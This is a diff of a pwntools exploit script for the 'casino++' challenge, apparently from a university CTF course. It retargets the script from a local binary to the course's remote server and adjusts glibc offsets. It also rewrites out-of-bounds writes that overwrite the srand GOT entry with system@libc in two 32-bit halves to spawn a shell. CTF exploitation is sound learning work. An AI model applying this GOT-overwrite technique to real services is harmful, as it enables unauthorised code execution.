@@ -24,8 +24,8 @@ def casinoLoop(which, lhalf, rhalf):
     r.sendlineafter("Chose the number {}: ".format(which), str(lhalf))
 
 
-r = process('./casino++')
-# r = remote('edu-ctf.csie.org', 10176)
+# r = process('./casino++', env={"LD_PRELOAD" : "./libc.so"})
+r = remote('edu-ctf.csie.org', 10176)
 # r = remote('127.0.0.1', 8888)
 pause()
 
@@ -64,26 +64,28 @@ r.sendlineafter("Chose the number {}: ".format(offset_from_guess_to_seed - 1), s
 success("changing seed to sh fin")
 
 ################################################# change srand to system
-##printf@glibc -> 0x571c0
-##system@glibc -> 0x491c0
-offset_from_printf_to_system = 0x491c0 - 0x571c0
+##printf@glibc -> 0x64e80
+##system@glibc -> 0x4f440
+offset_from_printf_to_system = 0x4f440 - 0x64e80
 system_libc = printf_libc + offset_from_printf_to_system
+system_libc_right = system_libc & 0xffffffff
 system_libc_left = system_libc >> 32
-success("system@libc: {:x}".format(system_libc))
+success("changing srand to system@libc: {:x}".format(system_libc))
 guess = [0x0f, 0x4c, 0x2d, 0x37, 0x3e, 0x05]
 for i in range(6):
     r.sendlineafter("Chose the number {}: ".format(i), "87")
 
 r.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
-r.sendlineafter("Which number [1 ~ 6]: ", str(-offset_from_guess_to_srandgot))
-r.sendlineafter("Chose the number {}: ".format(-offset_from_guess_to_srandgot - 1), str(system_libc)) # replace puts@libc to casino()
+r.sendlineafter("Which number [1 ~ 6]: ", str(-offset_from_guess_to_srandgot + 1))
+r.sendlineafter("Chose the number {}: ".format(-offset_from_guess_to_srandgot), str(system_libc_right)) # replace puts@libc to casino()
 
 for i in range(6):
     r.sendlineafter("Chose the number {}: ".format(i), str(guess[i]))
 
 r.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
-r.sendlineafter("Which number [1 ~ 6]: ", str(-offset_from_guess_to_srandgot + 1))
-r.sendlineafter("Chose the number {}: ".format(-offset_from_guess_to_srandgot), str(system_libc_left)) # replace srand with system@libc
+# r.recvuntil("Change the number? [1:yes 0:no]: ")
+r.sendlineafter("Which number [1 ~ 6]: ", str(-offset_from_guess_to_srandgot + 2))
+r.sendlineafter("Chose the number {}: ".format(-offset_from_guess_to_srandgot + 1), str(system_libc_left)) # replace srand with system@libc
 success("changed srand to system")
 
 
